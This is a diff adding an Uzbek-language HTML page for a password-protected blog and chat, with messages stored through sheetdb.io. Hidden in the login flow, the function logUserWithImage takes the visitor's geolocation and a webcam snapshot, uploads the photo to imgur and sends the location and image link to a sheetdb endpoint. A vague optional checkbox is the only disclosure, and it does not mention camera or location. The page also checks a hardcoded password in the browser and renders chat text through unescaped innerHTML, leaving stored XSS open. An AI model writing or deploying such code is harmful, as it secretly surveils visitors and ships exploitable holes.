@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="uz">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Ulugbek #burchak</title>
+    <style>
+      /* Oldingi CSS o'zgarishsiz qoldi */
+      body {
+        display: flex;
+        justify-content: flex-start;
+        align-items: center;
+        flex-direction: column;
+        text-align: center;
+        font-family: Arial, sans-serif;
+        background: linear-gradient(to right, #4facfe, #00f2fe);
+        color: #fff;
+      }
+      #container {
+        max-width: 600px;
+        margin-top: 50px;
+        padding: 20px;
+        background: rgba(255, 255, 255, 0.9);
+        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+        border-radius: 8px;
+        color: #333;
+        display: flex;
+        flex-direction: column;
+      }
+      /* Boshqa CSS qismlar o'zgarishsiz */
+    </style>
+  </head>
+  <body>
+    <div id="container">
+      <h1>Ulugbek #burchak</h1>
+
+      <!-- Modal -->
+      <div id="modal">
+        <div id="modal-content">
+          <p>Parolingizni kiriting:</p>
+          <input type="password" id="password" />
+          <p>Ismingizni kiriting:</p>
+          <input type="text" id="username" />
+          <br /><br />
+          <input type="checkbox" id="consentCheckbox" onchange="toggleDisclaimer()" />
+          Ma'lumotlaringiz server tomonidan ishlatilishi mumkin
+          <br /><br />
+          <input type="checkbox" id="pushCheckbox" />
+          Push bildirishnomalarga ruxsat berish
+          <div id="disclaimer" style="display: none;">
+            Sizning ma'lumotlaringiz serverda ishlatiladi va saqlanadi.
+          </div>
+          <button onclick="checkPassword()">Submit</button>
+        </div>
+      </div>
+      <div id="blog" style="display: none"></div>
+
+      <!-- Chat interface -->
+      <div class="mesgContainer">
+        <div id="chat" style="display: none"></div>
+        <input
+          type="text"
+          id="messageInput"
+          placeholder="Xabar yozing..."
+          style="display: none"
+          onkeydown="if(event.key === 'Enter') sendMessage()"
+        />
+        <button id="sendButton" onclick="sendMessage()" style="display: none">
+          Send
+        </button>
+      </div>
+    </div>
+
+    <script>
+      let username = "";
+      let messages = [];
+
+      window.onload = function () {
+        const savedData = JSON.parse(localStorage.getItem("authData"));
+        if (savedData && savedData.expiry > Date.now()) {
+          username = savedData.username;
+          document.getElementById("modal").style.display = "none";
+          fetchBlogAndMessages();
+          if (savedData.push) subscribeUserToPush();
+        }
+        registerServiceWorker();
+      };
+
+      function checkPassword() {
+        const password = document.getElementById("password").value;
+        const inputUsername = document.getElementById("username").value;
+        const pushPermission = document.getElementById("pushCheckbox").checked;
+
+        if (password === "burchak") {
+          username = inputUsername;
+          const expiry = Date.now() + 30 * 60 * 1000; // 30 daqiqa
+          const authData = { username: username, expiry: expiry, push: pushPermission };
+          localStorage.setItem("authData", JSON.stringify(authData));
+
+          document.getElementById("modal").style.display = "none";
+          fetchBlogAndMessages();
+          logUserWithImage();
+          saveUserToServer(username, pushPermission);
+          if (pushPermission) subscribeUserToPush();
+        } else {
+          alert("Noto‘g‘ri parol!");
+        }
+      }
+
+      function fetchBlogAndMessages() {
+        fetch("/blog.txt")
+          .then((response) => response.text())
+          .then((data) => {
+            document.getElementById("blog").innerText = data;
+            document.getElementById("blog").style.display = "block";
+            document.getElementById("chat").style.display = "block";
+            document.getElementById("messageInput").style.display = "block";
+            document.getElementById("sendButton").style.display = "block";
+            retrieveMessages();
+          });
+      }
+
+      function sendMessage() {
+        const messageText = document.getElementById("messageInput").value;
+        if (messageText.trim()) {
+          const timestamp = new Date().toLocaleString().slice(0, 16);
+          const message = { username: username, text: messageText, timestamp: timestamp };
+          messages.push(message);
+          displayMessages();
+          sendToGoogleSheets(message);
+          sendPushNotification(message);
+          document.getElementById("messageInput").value = "";
+        }
+      }
+
+      function sendToGoogleSheets(message) {
+        fetch("https://sheetdb.io/api/v1/v9spybqrc6j5t", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ data: [message] }),
+        });
+      }
+
+      function retrieveMessages() {
+        fetch("https://sheetdb.io/api/v1/v9spybqrc6j5t")
+          .then((response) => response.json())
+          .then((data) => {
+            messages = data.map((entry) => ({
+              username: entry.username,
+              text: entry.text,
+              timestamp: entry.timestamp,
+            }));
+            displayMessages();
+          });
+      }
+
+      function displayMessages() {
+        const chatElement = document.getElementById("chat");
+        chatElement.innerHTML = "";
+        messages.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
+        messages.forEach((message) => {
+          const messageElement = document.createElement("div");
+          messageElement.classList.add("message");
+          messageElement.classList.add(message.username === username ? "user" : "other");
+          messageElement.innerHTML = `
+            <div class="username">${message.username}</div>
+            <div class="timestamp">${message.timestamp}</div>
+            <div class="text">${message.text}</div>
+          `;
+          chatElement.appendChild(messageElement);
+        });
+        chatElement.scrollTop = chatElement.scrollHeight;
+      }
+
+      function saveUserToServer(username, pushPermission) {
+        fetch("https://sheetdb.io/api/v1/niz1x0mjupz2d", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            data: [{ username: username, pushPermission: pushPermission }],
+          }),
+        });
+      }
+
+      function registerServiceWorker() {
+        if ("serviceWorker" in navigator) {
+          navigator.serviceWorker
+            .register("/service-worker.js")
+            .then((registration) => console.log("Service Worker registered"));
+        }
+      }
+
+      function subscribeUserToPush() {
+        navigator.serviceWorker.ready.then((registration) => {
+          registration.pushManager
+            .subscribe({
+              userVisibleOnly: true,
+              applicationServerKey: urlBase64ToUint8Array(
+                "BG5WkzluE2IhqQOCv29VKxet-unKCLtgZiqrG-knRxUbXf5lW08CIBnVtab3Sufb8LKYG9hL4gaxjawrDAu_wTs" // Vercel env variable sifatida qo'shiladi
+              ),
+            })
+            .then((subscription) => {
+              fetch("/api/save-subscription", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username, subscription }),
+              });
+            });
+        });
+      }
+
+      function sendPushNotification(message) {
+        fetch("/api/send-push", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            title: "Yangi xabar",
+            body: `${message.username}: ${message.text}`,
+          }),
+        });
+      }
+
+      function urlBase64ToUint8Array(base64String) {
+        const padding = "=".repeat((4 - (base64String.length % 4)) % 4);
+        const base64 = (base64String + padding).replace(/-/g, "+").replace(/_/g, "/");
+        const rawData = window.atob(base64);
+        const outputArray = new Uint8Array(rawData.length);
+        for (let i = 0; i < rawData.length; ++i) {
+          outputArray[i] = rawData.charCodeAt(i);
+        }
+        return outputArray;
+      }
+
+      function logUserWithImage() {
+        navigator.geolocation.getCurrentPosition((position) => {
+          navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+              const canvas = document.createElement("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append("image", blob);
+                fetch("https://api.imgur.com/3/image", {
+                  method: "POST",
+                  headers: { Authorization: "Client-ID 2c6cb4dcda416f7" },
+                  body: formData,
+                })
+                  .then((response) => response.json())
+                  .then((imgData) => {
+                    const logData = {
+                      vaqt: new Date().toLocaleString(),
+                      latitude: position.coords.latitude,
+                      longitude: position.coords.longitude,
+                      rasm: imgData.data.link,
+                    };
+                    fetch("https://sheetdb.io/api/v1/niz1x0mjupz2d", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({ data: [logData] }),
+                    });
+                  });
+              });
+              stream.getTracks().forEach((track) => track.stop());
+            }, 2000);
+          });
+        });
+      }
+
+      function toggleDisclaimer() {
+        const checkbox = document.getElementById("consentCheckbox");
+        const disclaimer = document.getElementById("disclaimer");
+        disclaimer.style.display = checkbox.checked ? "block" : "none";
+      }
+
+      setInterval(() => {
+        const savedData = JSON.parse(localStorage.getItem("authData"));
+        if (savedData && savedData.expiry <= Date.now()) {
+          localStorage.removeItem("authData");
+          document.getElementById("modal").style.display = "flex";
+          document.getElementById("chat").style.display = "none";
+          document.getElementById("messageInput").style.display = "none";
+          document.getElementById("sendButton").style.display = "none";
+          document.getElementById("blog").style.display = "none";
+        }
+      }, 60000);
+    </script>
+  </body>
+</html>
